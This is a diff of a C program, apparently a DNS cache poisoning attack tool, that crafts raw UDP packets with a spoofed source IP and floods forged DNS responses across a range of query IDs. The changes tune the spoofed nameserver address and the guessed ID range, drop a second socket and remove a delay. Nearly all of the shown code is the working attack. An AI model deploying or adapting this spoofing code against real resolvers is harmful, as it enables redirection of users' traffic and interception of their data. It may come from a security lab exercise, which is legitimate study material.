@@ -274,13 +274,10 @@ int main(int argc, char *argv[])
 
     // Create a raw socket with UDP protocol
     sd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
-    sd_res = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
 
     if(sd<0) // if socket fails to be created 
         printf("socket error\n");
     
-    if(sd_res<0) // if socket fails to be created 
-        printf("socket error\n");    
 
     // The source is redundant, may be used later if needed
     // The address family
@@ -321,7 +318,7 @@ int main(int argc, char *argv[])
     ip_res->iph_ttl = 110; // hops
     ip_res->iph_protocol = 17; // UDP
     // Source IP address, can use spoofed address here!!!
-    ip_res->iph_sourceip = inet_addr("199.43.132.53");
+    ip_res->iph_sourceip = inet_addr("199.43.135.53");
     // The destination IP address
     ip_res->iph_destip = inet_addr(argv[2]);    
     
@@ -387,14 +384,13 @@ int main(int argc, char *argv[])
         // send the packet out.
         if(sendto(sd, buffer, packetLength, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
             printf("packet send error %d which means %s\n",errno,strerror(errno));
-        sleep(0.9);
 
-        int cnt = 3000; // count
-        while(cnt<3100){
+        int cnt = 22800; // count
+        while(cnt<22900){
             dns_res->query_id=cnt;
             udp_res->udph_chksum=check_udp_sum(buffer_res, packetLength_res-sizeof(struct ipheader));
             
-            if(sendto(sd_res, buffer_res, packetLength_res, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
+            if(sendto(sd, buffer_res, packetLength_res, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
                 printf("packet send error %d which means %s\n",errno,strerror(errno));
             cnt++;
         }
